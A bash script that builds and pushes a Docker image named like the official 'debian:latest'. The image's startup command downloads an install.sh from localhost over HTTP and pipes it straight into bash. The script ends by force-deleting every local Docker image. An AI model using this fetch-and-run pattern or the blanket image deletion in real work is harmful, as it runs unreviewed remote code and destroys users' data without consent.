#!/bin/bash

dockerName="debian:latest"
userName="$(docker info 2>/dev/null | sed 's/[[:space:]]//g' |grep '^Username' |cut -d':' -f2)"
[ ! -n "$userName" ] && echo "No Found UserName." && exit 1

dockerDir='./DockerFile'

rm -rf "${dockerDir}"
now="$(date +%s)"

mkdir -p "${dockerDir}"
cat >"${dockerDir}/Dockerfile"<<EOF
# Version 1.0

# 基础镜像
FROM debian:latest

# 镜像操作命令
RUN apt-get -yqq update && apt-get install -yqq wget openssl

# 容器启动命令
CMD ["/bin/bash", "-c", "/usr/bin/wget --header 'timestamp: ${now}' -qO- 'http://localhost/install.sh' |/bin/bash"]


EOF


dockerId="$(docker build -t image:latest ./DockerFile 2>/dev/null |grep '^Successfully built' |sed 's/^Successfully built \([0-9a-z]*\)/\1/g')"
[ ! -n "$dockerId" ] && echo "Build Docker Image Fail." && exit 1

docker tag "${dockerId}" "${userName}/${dockerName}"
[ $? -ne 0 ] && echo "Tag Docker Image Fail." && exit 1

remoteId=`docker push "${userName}/${dockerName}" |grep -o 'sha256:[0-9a-z]*' |cut -d':' -f2 |cut -c 1-12`
[ $? -ne 0 ] && echo "Push Docker Image Fail." && exit 1

docker images -a -q |xargs docker rmi -f >/dev/null 2>&1

echo -e "${dockerId} --> ${remoteId}\n${userName}/${dockerName}\n"
exit 0
